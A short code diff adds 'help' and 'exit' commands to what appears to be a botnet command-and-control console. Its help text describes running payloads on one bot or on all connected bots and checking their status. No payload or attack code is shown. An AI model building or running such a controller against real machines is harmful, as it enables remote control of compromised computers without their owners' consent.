@@ -93,7 +93,17 @@ async def main():
             # status
             elif command[0] == "status":
                 server_status(ctx)
+            elif command[0] in ["?", "help"]:
+                print(("Commands:\n\n"
+                        "Execute payload on one bot:\n"
+                        "\tone <id> <command>\n\n"
+                        "Execute payload on all bots:\n"
+                        "\tall <command>\n\nShow status of connected bots:\n"
+                        "\tstatus\n"))
             # unknown
+            elif command[0] == "exit":
+                print("Exiting..")
+                exit(0)
             else:
                 print(f"unknown command '{command[0]}'")
         except Exception as e:
